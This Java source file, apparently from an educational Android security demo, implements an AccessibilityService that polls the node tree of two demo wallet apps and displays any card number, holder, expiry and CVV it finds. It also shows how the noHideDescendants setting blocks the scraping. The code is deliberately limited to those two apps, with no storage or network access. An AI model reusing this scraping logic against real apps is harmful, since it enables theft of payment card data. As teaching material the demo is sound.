package com.kavacon.a11yreaderdemo;

import android.accessibilityservice.AccessibilityService;
import android.os.Handler;
import android.os.Looper;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayDeque;
import java.util.Arrays;
import java.util.Deque;
import java.util.HashSet;
import java.util.Set;

/**
 * CardReaderService — pieza central de la demo educativa de Kavacon.
 *
 * Qué hace:
 *   - Solo considera los paquetes listados en res/xml/accessibility_service_config.xml
 *     (reforzado aquí con un chequeo en código).
 *   - Recorre el árbol de {@link AccessibilityNodeInfo} de la ventana activa buscando
 *     nodos cuyo resource-id O contentDescription contenga uno de los FIELD_HINTS.
 *     No distingue entre un campo declarado en XML (tarjetas 1-3) y uno creado en
 *     código en vivo (formulario "Agregar tarjeta" de WalletVulnerable): a ambos se
 *     les asigna la misma etiqueta canónica, así que la lectura es idéntica para
 *     cualquier tarjeta, vieja o nueva.
 *   - No depende solo de los AccessibilityEvent entrantes (Android los limita/agrupa
 *     cuando la pantalla no cambia): además sondea la ventana activa cada ~700 ms
 *     mientras el servicio está conectado, así que sigue leyendo de forma continua.
 *   - Publica el resultado en {@link ReaderBridge}, que la pantalla de esta misma app
 *     ({@link MainActivity}) pinta en vivo. Sin overlay, sin permisos adicionales.
 *
 * Qué NO hace (a propósito, para que sea una demo inerte y no una herramienta):
 *   - No escribe nada a disco, SharedPreferences, ni base de datos.
 *   - No hace ninguna llamada de red (la app ni siquiera declara el permiso INTERNET).
 *   - No mantiene historial persistente: {@link ReaderBridge} es un buffer en RAM
 *     acotado, y al cerrar/desactivar el servicio todo lo leído desaparece.
 *
 * Contra WalletVulnerable: encuentra y publica PAN/CVV completos (ataque exitoso,
 * para ilustrar el riesgo). Contra WalletSecure: los contenedores sensibles tienen
 * importantForAccessibility="noHideDescendants", por lo que estos nodos ni siquiera
 * aparecen en el árbol — el servicio lo reporta explícitamente como "sin acceso".
 */
public class CardReaderService extends AccessibilityService {

    private static final Set<String> TARGET_PACKAGES = new HashSet<>(Arrays.asList(
            "com.kavacon.walletvulnerable",
            "com.kavacon.walletsecure"
    ));

    private static final String[] FIELD_HINTS = {
            "card_number", "card_holder", "card_expiry", "card_cvv"
    };

    private static final long POLL_INTERVAL_MS = 700;

    private static volatile CardReaderService instance;

    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable pollRunnable = new Runnable() {
        @Override
        public void run() {
            scanAndPublish();
            handler.postDelayed(this, POLL_INTERVAL_MS);
        }
    };

    // Evita republicar el mismo bloque si no cambió nada en pantalla.
    private String lastPublished = null;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        handler.post(pollRunnable);
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // El sondeo periódico es la vía principal; el evento solo acelera la
        // siguiente lectura en vez de esperar al próximo tick.
        scanAndPublish();
    }

    private void scanAndPublish() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;

        CharSequence pkg = root.getPackageName();
        if (pkg == null || !TARGET_PACKAGES.contains(pkg.toString())) {
            root.recycle();
            return;
        }

        StringBuilder found = new StringBuilder();
        collectMatchingFields(root, found);
        root.recycle();

        String pkgLabel = pkg.toString().equals("com.kavacon.walletvulnerable")
                ? "WalletVulnerable" : "WalletSecure";

        String display = found.length() == 0
                ? "🔒 [" + pkgLabel + "] Sin campos sensibles accesibles "
                    + "(importantForAccessibility los excluye del árbol)"
                : "📡 [" + pkgLabel + "] Leído vía AccessibilityNodeInfo:\n" + found;

        publishIfChanged(display);
    }

    private void publishIfChanged(String display) {
        if (!display.equals(lastPublished)) {
            lastPublished = display;
            ReaderBridge.publish(display);
        }
    }

    /** Recorrido BFS del árbol de nodos buscando resource-ids/contentDescriptions que calcen. */
    private void collectMatchingFields(AccessibilityNodeInfo root, StringBuilder out) {
        Deque<AccessibilityNodeInfo> queue = new ArrayDeque<>();
        queue.add(root);

        while (!queue.isEmpty()) {
            AccessibilityNodeInfo node = queue.poll();
            if (node == null) continue;

            String viewId = node.getViewIdResourceName();
            CharSequence desc = node.getContentDescription();
            CharSequence text = node.getText();

            String hint = matchingHint(viewId);
            if (hint == null && desc != null) hint = matchingHint(desc.toString());

            if (hint != null && text != null) {
                out.append("  • ").append(hint).append(" = \"").append(text).append("\"\n");
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) queue.add(child);
            }

            if (node != root) node.recycle();
        }
    }

    /** Devuelve el hint canónico que matchea (igual para XML id o contentDescription), o null. */
    private String matchingHint(String s) {
        if (s == null) return null;
        for (String hint : FIELD_HINTS) {
            if (s.contains(hint)) return hint;
        }
        return null;
    }

    /** Llamado desde MainActivity al presionar "Borrar logs": fuerza una lectura inmediata. */
    public static void requestRecheck() {
        CardReaderService svc = instance;
        if (svc == null) return;
        svc.handler.post(() -> {
            svc.lastPublished = null;
            svc.scanAndPublish();
        });
    }

    @Override
    public void onInterrupt() {
        // No-op: no hay overlay ni recursos externos que liberar.
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacks(pollRunnable);
        instance = null;
    }
}
